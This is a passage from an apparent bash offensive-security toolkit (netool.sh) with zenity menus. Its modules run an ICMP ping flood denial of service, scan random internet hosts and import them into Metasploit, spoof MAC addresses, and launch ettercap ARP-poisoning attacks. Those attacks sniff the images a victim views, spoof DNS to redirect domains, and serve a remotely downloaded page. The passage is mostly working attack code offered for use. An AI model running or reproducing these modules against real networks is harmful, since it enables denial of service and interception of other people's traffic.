   sh_gcct

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}


sh_gcct () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE" --text "Store recent scan on t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "Append scan to DataBase" FALSE "Clear Database and Append scan" FALSE "Clear Database and manually input" --width 330 --height 220) > /dev/null 2>&1


     if [ "$dbt" = "Append scan to DataBase" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/geobytes.log`
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Scan Appended to DataBase" --width 300 > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and Append scan" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/geobytes.log`
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean and\nnew scan Appended" --width 300 > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="INPUT TARGET TO DATABASE" --text "You can input TARGET-IP, NOTES , ETC..." --entry --width 300) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1
       sh_2menu


else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}














# -----------------------------------
# ping-of-dead (D0S)
# -----------------------------------
sh_dead () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module uses ICMP '(ping)' packets to D0S ${Reset};
   echo ${YellowF}' |_' a target host on [${GreenF} WAN ${YellowF}] or [${GreenF} LAN ${YellowF}] networks ${Reset};
   echo ""
   echo ${BlueF}[+]:${white}[RUNNING ICMP D0S] ${Reset};
   pingdead=$(zenity --title="DOMAIN OR IP ADDR" --text "example: www.pot.com\nexample: 192.94.34.100" --width 300 --entry) > /dev/null 2>&1
   size=$(zenity --scale --title "ICMP Denial-Of-Service" --text "CHOSE ICMP PACKET SIZE" --min-value=1 --max-value=6000 --value=1 --step 1) > /dev/null 2>&1
   howmany=$(zenity --scale --title "ICMP Denial-Of-Service" --text "HOW MANY PACKETS TO SEND" --min-value=10 --max-value=60000 --value=10 --step 1) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]:${white}Checking:${GreenF}[ $pingdead ] ${Reset};


  # ping target to see if we is online
  ping -c 1 $pingdead > /dev/null 2>&1
  if [ "$?" != 0 ]

then

    echo ${RedF}[x]:[warning]:${white}Target seems to be:${RedF}[ OFFLINE ]${Reset};
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    sleep 3
    sh_2menu

else

    sleep 1
    echo ${BlueF}[*]${RedF}:${BlueF}[Ping target]:${white}Target seems to be:${GreenF}[ ONLINE ]${Reset};
    sleep 1
    echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}Running exploit...${Reset};
    sleep 2
    xterm -T "netool.sh - press [ctrl+c] to stop D0S attack" -geometry 110x23 -e "ping -c $howmany -s $size $pingdead && sleep 6"
    sh_2menu
fi
}







# -----------------------------------
# execute a nmap command from the script
# -----------------------------------
sh_nmc () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  Browse a Pre-defined nmap commands list [help]${Reset};
   echo ${YellowF}' |'  And execute the chosen Nmap Command. ${Reset};
   echo ${YellowF}' |_'${RedF} LOGFILE:${white} opensource/logs/UserScan.log ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   # build help file (display)
   echo "" > ~/opensource/logs/UserScan.log
   echo ":[ SCAN LOCAL NETWORK ]" >> ~/opensource/logs/UserScan.log
   echo "nmap -sn <target IP/24>" >> ~/opensource/logs/UserScan.log
   echo "" >> ~/opensource/logs/UserScan.log
   echo ":[ SCAN AGRESSIVE ]" >> ~/opensource/logs/UserScan.log
   echo "nmap -A -sS -Pn <target IP>" >> ~/opensource/logs/UserScan.log
   echo "" >> ~/opensource/logs/UserScan.log
   echo ":[ SCAN SPOOFING ip addr ]" >> ~/opensource/logs/UserScan.log
   echo "nmap -e wlan0 -sS -Pn --version-all -O -S <fake ip addr> <target IP>" >> ~/opensource/logs/UserScan.log
   echo "" >> ~/opensource/logs/UserScan.log
   echo ":[ SCAN USING ALL NSE SCRIPTS ]" >> ~/opensource/logs/UserScan.log
   echo "nmap --script all <target IP>" >> ~/opensource/logs/UserScan.log
   echo "" >> ~/opensource/logs/UserScan.log
   echo ":[ SAVE OUTPUT TO LOGFILE ]" >> ~/opensource/logs/UserScan.log
   echo "nmap -sS -Pn -O -v <target IP> -oN <path/report.log>" >> ~/opensource/logs/UserScan.log
   echo "" >> ~/opensource/logs/UserScan.log
   echo ":[ RESUME AN ABORTED SCAN ]" >> ~/opensource/logs/UserScan.log
   echo "nmap -sV --resume <path/filename>" >> ~/opensource/logs/UserScan.log

   # display help file
   cat ~/opensource/logs/UserScan.log | zenity --title "NMAP HELP" --text-info --width 530 --height 300 > /dev/null 2>&1

    # input nmap command
    nmapco=$(zenity --title="NMAP COMMAND" --text "example: nmap -sn <target IP/24>\nexample: nmap -sV -A -O <target IP>\nexample: nmap --script all <target IP>" --width 550 --entry) > /dev/null 2>&1
    $nmapco -oN ~/opensource/logs/UserSet.log | zenity --progress --pulsate --width 300 --title "SCANING TARGET" --text="INTERFACE: $inter\nLOGFILE: UserSet.log" --percentage=0 --auto-close > /dev/null 2>&1
    cat ~/opensource/logs/UserSet.log | zenity --title "USER SCAN REPORT" --text-info --width 730 --height 300 > /dev/null 2>&1
    sh_gvvit
else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}


sh_gvvit () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE" --text "Store recent scan on t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "Append scan to DataBase" FALSE "Clear Database and Append scan" FALSE "Clear Database and manually input" --width 330 --height 220) > /dev/null 2>&1


     if [ "$dbt" = "Append scan to DataBase" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/UserSet.log`
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Scan Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and Append scan" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/UserSet.log`
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean and\nnew scan Appended" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="INPUT TARGET TO DATABASE" --text "You can input TARGET-IP, NOTES , ETC..." --entry --width 300) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}














# -----------------------------------
# search for specific port open in the external network
# -----------------------------------
sh_extlan () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module searches For random targets with a Specified port${Reset};
   echo ${YellowF}' |_' open 'in' external network '(WAN)' and port the targets found to msf db${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   NUM=$(zenity --scale --title "SCAN WAN NETWORK" --text "Nº LIMIT OF HOSTS TO FOUND" --min-value=1 --max-value=1027 --value=1 --step 1) > /dev/null 2>&1
   PORT=$(zenity --title="PORTS TO SEARCH" --text " example: 21,139,445" --width 300 --entry) > /dev/null 2>&1
   output=$(zenity --list --title "LOGFILE OUTPUT FORMAT" --text "log => port scan to toolkit database\nxml => port scan to msf database" --radiolist --column "Pick" --column "Option" TRUE "output in log (t00lkit db)" FALSE "Output in xml (msf db)" --width 330 --height 220) > /dev/null 2>&1
   sh_cshh

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
   sh_2menu
fi
}



sh_cshh () {
Colors;
 
 
 if [ "$output" = "output in log (t00lkit db)" ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCANS ] ${Reset};
   nmap -iR $NUM -sS -Pn -p $PORT --open -oN ~/opensource/logs/Random-Hosts.log | zenity --progress --pulsate --title "SCANING WAN NETWORK" --text="LOGFILE: Random-Hosts.log\nHOSTS: $NUM ONLY: open PORTS: $PORT" --percentage=0 --auto-close > /dev/null 2>&1
      cat ~/opensource/logs/Random-Hosts.log | zenity --title "SCAN WAN NETWORK REPORT" --text-info --width 730 --height 500 > /dev/null 2>&1
      chown $usera ~/opensource/logs/Random-Hosts.log > /dev/null 2>&1
      sleep 1
      sh_hdtt3
 
else
 
   Colors;
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCANS ] ${Reset};
   echo "" > ~/opensource/logs/Random-Hosts.xml
   nmap -iR $NUM -sS -Pn -O -p $PORT --open -oX ~/opensource/logs/Random-Hosts.xml | zenity --progress --pulsate --title "SCANING WAN NETWORK" --text="LOGFILE: Random-Hosts.xml\nHOSTS: $NUM ONLY: open PORTS: $PORT" --percentage=0 --auto-close > /dev/null 2>&1
   chown $usera ~/opensource/logs/Random-Hosts.xml > /dev/null 2>&1
   sh_fff
fi
}




sh_hdtt3 () {
Colors;
 
   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE" --text "Store scan on t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "Append scan to DataBase" FALSE "Clear Database and Append scan" FALSE "Clear Database and manually input" --width 330 --height 180) > /dev/null 2>&1
 
 
     if [ "$dbt" = "Append scan to DataBase" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/Random-Hosts.log`
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Scan Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       cd ~/opensource
       sh_2menu
 
 
     elif [ "$dbt" = "Clear Database and Append scan" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/Random-Hosts.log`
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean and\nnew scan Appended" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       cd ~/opensource
       sh_2menu
 
 
     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="INPUT TARGET TO DATABASE" --text "You can input TARGET-IP, NOTES , ETC..." --entry --width 300) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       cd ~/opensource
       sh_2menu
 
 
else
 
   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   cd ~/opensource
   sh_2menu
fi
}


sh_fff () {
Colors;
 
   # generate resource file 
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
   echo "db_import $H0m3/opensource/logs/Random-Hosts.xml" > $H0m3/opensource/logs/msfdb.rc
   echo "hosts" >> $H0m3/opensource/logs/msfdb.rc
   echo "services" >> $H0m3/opensource/logs/msfdb.rc
   chown $usera $H0m3/opensource/logs/msfdb.rc > /dev/null 2>&1
   sleep 2
 
     echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ START MSF SERVICES ] ${Reset};
     # start postgresql+metasploit db
     # /etc/init.d/postgresql start > /dev/null 2>&1
     # /etc/init.d/metasploit start > /dev/null 2>&1
     service metasploit start > /dev/null 2>&1
 
       # access msfdatabase 
       echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ START METASPLOIT ] ${Reset};
       zenity --info --title="INTERACTING WITH MSF DATABASE" --text "msf > search [sevice name]\nmsf > use [auxiliary/exploit]\nmsf (aux): show options\nmsf (aux): set RHOST [ip addr]\nmsf (aux): exploit\n\n(cleanning database)\nmsf > hosts -d" --width 360 > /dev/null 2>&1
       xterm -T "METASPLOIT" -geometry 110x23 -e "sudo msfconsole -r $H0m3/opensource/logs/msfdb.rc"
       sleep 2
 
     # clear recent files made
     zenity --info --title="METASPLOIT DATABASE" --text "please wait:\ncleaning recent configs..." --width 300 > /dev/null 2>&1
     echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ CLEANING FILES ] ${Reset};
     rm $H0m3/opensource/logs/msfdb.rc > /dev/null 2>&1
     rm $H0m3/opensource/logs/Random-Hosts.xml > /dev/null 2>&1
     rm $H0m3/opensource/logs/report.log > /dev/null 2>&1
     service metasploit stop > /dev/null 2>&1
   cd ~/opensource
   sh_2menu
}





















# -----------------------------------
# mac changer (change your mac address and ip address)
# -----------------------------------
sh_macchan () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module changes the mac address of interface:${GreenF}$inter ${Reset};
   echo ${YellowF}' |_'${RedF} WARNING:${white} At every startup the mac will be reset to default ${Reset};
   echo ""
   macchanger -s $inter | zenity --title "MAC CURRENT SETTINGS" --text-info --width 480 --height 170 > /dev/null 2>&1
      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then


     Colors;
     # stoping interface
     echo ${RedF}[x]:[ STOP: $inter ] ${Reset};
     service network-manager stop > /dev/null 2>&1
     sleep 4
     # using macchanger to change mac address
     echo ""
     macchanger -r $inter
        sleep 4
        echo ""
        # restarting interface
        echo ${BlueF}[*]${RedF}:${GreenF}[ RESTART: $inter ] ${Reset};
        service network-manager start > /dev/null 2>&1
        sleep 17
        macchanger -s $inter | zenity --title "MAC CURRENT SETTINGS" --text-info --width 480 --height 170 > /dev/null 2>&1
        sh_2menu

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
   sh_2menu
fi
}







sh_manuall () {


   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  this module changes your interface mac address [manual]${Reset};
   echo ${YellowF}' |'  the selected Interface [${GreenF} $inter ${YellowF}] ${Reset};
   echo ${YellowF}' |_'${RedF} WARNING:${white} At every startup the mac will be reset to default ${Reset};
   echo ""
      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   # run macchanger
   echo -n "[+]:{wlan0.eth0,lo}(chose interface):"
   read interface
   echo -n "[+]:{08:00:27:b7:97:2b}(enter Mac addr):"
   read intu
   echo ${GreenF}[!]${RedF}:{wait}${BlueF} Stoping interface:${RedF}[$interface] ${BlueF}and openning macchanger GUI ${Reset};
   echo ""
   sleep 2
   echo ""
   echo ${GreenF}Mac Address current config:${Reset};
   macchanger -s $interface
     # stoping interface
     echo ${GreenF}Stoping Interface:${RedF}[$interface]${Reset};
     service network-manager stop
     echo ""
     sleep 4
        # using macchanger to change mac address
        macchanger --mac $intu $interface
        sleep 4
        echo ""
        Colors;
           # restarting interface
           echo ${GreenF}Restart Interface:${RedF}[$interface]${Reset};
           service network-manager start
           sleep 17
              # store scan in a temp.txt file for later display
              echo report > ~/opensource/logs/temp.txt
              ifconfig $interface  >> ~/opensource/logs/temp.txt
              echo ${GreenF}Current IP address:${Reset};
              cat ~/opensource/logs/temp.txt | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1
              echo ${GreenF}Current Mac Address:${Reset};
              macchanger -s $interface | grep "Current" | awk '{print $2,$3,$4,$5}'
      echo ""
      echo ""
      # delete temp.txt report file
      rm ~/opensource/logs/temp.txt
      sleep 2
      sh_2menu

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
   sh_2menu
fi
}









# -----------------------------------
# open the router config page
# -----------------------------------
sh_router () {
Colors;

   echo ${YellowF}"  _"
   echo ${YellowF}' |'  This module opens the router config page of your router ${Reset};
   echo ${YellowF}' |_' Default passw:${GreenF}http://portforward.com/default_username_password/ ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   GATE=`ip route | grep "static" | awk {'print $3'}`
   echo ${CyanF}[+]${RedF}:${white} OPENING WEB-BROWSER IN: {http://$GATE} ${Reset};
   su $usera -c "xdg-open http://$GATE" > /dev/null 2>&1
   echo ""
   sleep 1
   clear

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}







# -----------------------------------
# open ip_tracer website
# -----------------------------------
sh_tracer () {
   Colors;

   echo ${YellowF}"  _"
   echo ${YellowF}' |'  this module open the website of [whois] ip-address ${Reset};
   echo ${YellowF}' |'  with many info about target ip-address such as ${Reset};
   echo ${YellowF}' |_' db whois, geo-location, version of web-browser, etc... ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   echo ${CyanF}[+]${RedF}:${white} OPENING WEB-BROWSER IN:{http://www.ip-adress.com/ip_tracer/} ${Reset};
   su $usera -c "xdg-open http://www.ip-adress.com/ip_tracer/" > /dev/null 2>&1
   echo ""
   sleep 1
   clear

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}









# -----------------------------------
# capture pictures visited by target machine under MITM
# -----------------------------------
sh_finger () {
Colors;

   echo ${YellowF}"  _"
   echo ${YellowF}' |'  this module uses driftnet and ettercap to sniff pictures ${Reset};
   echo ${YellowF}' |_'  that a target is seeing on is web-browsing surfing ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   sh_tomala

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}

sh_tomala () {
Colors;

   if [ -d $confW ]; then
   echo ${GreenF}[!]${RedF}:${GreenF}DRIFTNET installation found...${Reset};
   echo ${GreenF}[!]${RedF}:${GreenF}ETTERCAP installation found...${Reset};
      interface=$(zenity --title="Input INTERFACE IN USE" --text "example: wlan0 or eth0" --entry --width 300) > /dev/null 2>&1
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read targ
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read rou

   cd $H0m3/opensource
   mkdir driftnet-capture > /dev/null 2>&1
   echo ""
   echo ${RedF}[x]:Press {q} to quit ettercap${Reset};
   sleep 2
      echo ${BlueF}[*]${RedF}:${BlueF}Sniff remote pictures of a target machine${Reset};
zenity --title="DRIFTNET CAPTURE FOLDER" --text "capture pictures will be stored under:\n$H0m3/opensource/driftnet-capture\n\nif driftnet windows is closed then driftnet-capture\nfolder will be deleted also You can save images to\nthe opensource directory by clicking on them." --width 450 --info > /dev/null 2>&1
      driftnet -i $interface -d driftnet-capture & ettercap -T -Q -i $interface -M arp /$targ// /$rou//
      rm -R $H0m3/opensource/driftnet-capture > /dev/null 2>&1
      cd $H0m3/opensource
      clear

else

   Colors;
   echo ${RedF}[x]:this script require driftnet installed to work${Reset};
   echo ${GreeF}[+]${RedF}:${GreenF}[opcional]: Downloading from network...${Reset};
   apt-get install driftnet
   sleep 3
exit
fi
}










# -----------------------------------
# sniff remote hosts with ettercap MITM
# -----------------------------------
sh_arp () {
Colors;

   if [ -d $find2 ]; then
   echo ${GreenF}[!]${RedF}:${GreenF}ETTERCAP installation found...${Reset};

else

   echo ${RedF}[x]:this script require ettercap installed to work${Reset};
   echo "[!] {opcional} Downloading from network..."
   sleep 4
   apt-get install ettercap-gtk
fi

   echo ${YellowF}"  _"
   echo ${YellowF}' |'   this module launch a man-in-the-middle attack against ${Reset};
   echo ${YellowF}' |_'  a target in the localnetwork, so we can capture TCP/IP packets ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   interface=$(zenity --title="Input INTERFACE IN USE" --text "example: wlan0 or eth0" --entry --width 300) > /dev/null 2>&1
   echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
   read targ
   echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
   read rou
      Colors;
      echo ${RedF}[x]:Press {q} to quit ettercap${Reset};
      echo ""
      echo ""
      sleep 3
      xterm -T "netool.sh - man-in-the-middle" -geometry 99x23 -e "ettercap -T -Q -i $interface -M arp /$rou// /$targ//"
      echo ""
      echo ""

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}










# -----------------------------------
# check if etter.conf exists and edit
# -----------------------------------
sh_edc () {
Colors;

   echo ${YellowF}"  _"
   echo ${YellowF}' |'  this module config the framework ettercap like privs ${Reset};
   echo ${YellowF}' |'  ip-forwarding, Tor-browser, Apache, etc... ${Reset};
   echo ${YellowF}' |_' ${RedF}[warning]:${CyanF}press [ctrl+x] to 'exit' the nano editor ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

sh_jkiu

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear

fi
}

sh_jkiu () {
   if [ -e $confE ]; then
   echo ${BlueF}[=]${RedF}:${BlueF}{wait} editing with nano...${Reset};
      sleep 5
      nano $confE
      Colors;
      echo ${GreenF}[!]${RedF}:${GreenF}etter.conf {saved}${Reset};
      sleep 2
      clear

else

   Colors;
   echo ${RedF}[x]:etter.conf not found...${Reset};
   sleep 2
   clear
fi
}










# -----------------------------------
# check if etter.dns exists DNS-spoofing
# -----------------------------------
sh_spoofing () {
Colors;

   if [ -e $confD ]; then
   echo ${GreenF}[!]${RedF}:${GreenF}ETTER.DNS found...${Reset};
   echo ${YellowF}"  _"
   echo ${YellowF}' |'  this module uses ettercap arp poison {MITM} and etter.dns {plugin} ${Reset};
   echo ${YellowF}' |'  to redirect web-domains to another ip address ${Reset};
   echo ${YellowF}' |_'  ${GreenF}[ ETTER.DNS ] found...${Reset};
   echo ""

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear

fi


      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   interface=$(zenity --title="Input INTERFACE IN USE" --text "example: wlan0 or eth0" --entry --width 300) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${white} editing etter.dns...${Reset};
   sleep 4
   nano $confD
   echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
   read targ
   echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
   read rou
   echo ${GreenF}[!]${RedF}:${GreenF}etter.dns {saved}${Reset};
   echo ${RedF}[x]:Press {q} to quit ettercap${Reset};
   echo ${BlueF}[*]${RedF}:${BlueF}DNS SPOOFING {redirect web-domains} ${Reset};
   sleep 3
   /etc/init.d/apache2 start
   xterm -T "netool.sh - DNS-Spoofing" -geometry 99x23 -e "ettercap -T -Q -i $interface -P dns_spoof -M arp /$rou// /$targ//" > /dev/null 2>&1
   # stop apache2 webserver if is running
   /etc/init.d/apache2 stop
   clear

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}














# -----------------------------------
# share files betewuin local hosts using DNS-spoofing
# -----------------------------------
sh_shared () {
Colors;

   if [ -e $confD ]; then
   echo ${GreenF}[!]${RedF}:${GreenF}ETTER.DNS found...${Reset};
   echo ${YellowF}"  _"
   echo ${YellowF}' |'  This module uses ettercap arp poison {MITM} and etter.dns {plugin} ${Reset};
   echo ${YellowF}' |'  and apache2 to share files 'in local' lan between PCs ${Reset};
   echo ${YellowF}' |_'  shared resource:${GreenF}http://127.0.0.1:80/repo ${Reset};
   echo ""

else

   Colors;
   echo ${RedF}[x]:etter.dns not found in:$confD... ${Reset};
   echo ${RedF}[x]:edit [toolkit_config] to 'set' the rigth path.${Reset};
   sleep 2
   clear

fi

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then


   interface=$(zenity --title="Input INTERFACE IN USE" --text "example: wlan0 or eth0" --entry --width 300) > /dev/null 2>&1
   shareappl=$(zenity --title "CHOSE APPLICATION/FILE TO SHARE" --filename=$IPATH --file-selection) > /dev/null 2>&1
   sharename=$(zenity --title="NAME YOUR APPLICATION" --text "example: opensource.tar.gz" --entry --width 300) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${white}{wait} editing with nano...${Reset};
   sleep 2
   xterm -T "DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
   echo ${GreenF}[!]${RedF}:${GreenF}etter.dns {saved}${Reset};
   echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
   read targ
   echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
   read rou
   sh_2try

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}


sh_2try () {
      Colors;

         if [ -d $apache/repo ]; then
            # copy the folder to apache2 server
            echo ${BlueF}[*]${RedF}:${BlueF}[copy files]:${white}to apache2 working directory...${Reset};
            sleep 2
            cp $shareappl $apache/repo/$sharename
            cd /tmp
            wget -q https://dl.dropboxusercontent.com/u/21426454/netool-kali/sharing.html
            mv sharing.html index.html 
            sudo cp index.html $apache/index.html
            /etc/init.d/apache2 start

         echo ${BlueF}[*]${RedF}:${BlueF}[share files]:${white}in local lan,open webbrowser in:${GreenF}[www.google.com/repo] ${Reset};
         echo ${RedF}[x]:Press {q} to quit ettercap${Reset};
         sleep 3
      xterm -T "netool.sh - share files in local lan" -geometry 99x23 -e "ettercap -T -Q -i $interface -P dns_spoof -M arp /$rou// /$targ//"
   sh_stapa2

else

      # copy the folder to apache2 server
      echo ${BlueF}[*]${RedF}:${BlueF}[copy files]:${white}to apache2 working directory...${Reset};
      echo ""
      sleep 2
      mkdir $apache/repo
      cp $shareappl $apache/repo/$sharename
      cd /tmp
      wget -q https://dl.dropboxusercontent.com/u/21426454/netool-kali/sharing.html
      mv sharing.html index.html 
      sudo cp index.html $apache/index.html
      /etc/init.d/apache2 start


      echo ""
      echo ${BlueF}[*]${RedF}:${BlueF}[share files]:${white}in local lan,open webbrowser in:${GreenF}[127.0.0.1/repo] ${Reset};
      echo ${RedF}[x]:Press {q} to quit ettercap${Reset};
      sleep 3
      xterm -T "netool.sh - netool.sh - share files in local lan" -geometry 99x23 -e "ettercap -T -Q -i $interface -P dns_spoof -M arp /$rou// /$targ//"
      sh_stapa2

fi
}



sh_stapa2 () {
      # stop apache2 webserver if is running
      /etc/init.d/apache2 stop

         if [ -e /tmp/index.html ]; then
         # clean up script
         rm -r /tmp/index.html
      clear
fi
}









# -----------------------------------
# sniff URLs visited by remote target
# -----------------------------------
sh_url () {
Colors;

   if [ -d $find2 ]; then
   echo ${GreenF}[!]${RedF}:${GreenF}ETTERCAP installation found...${Reset};
   echo ${YellowF}"  _"
   echo ${YellowF}' |'  this module uses ettercap arp poison {MITM} and remote_browser plugin ${Reset};
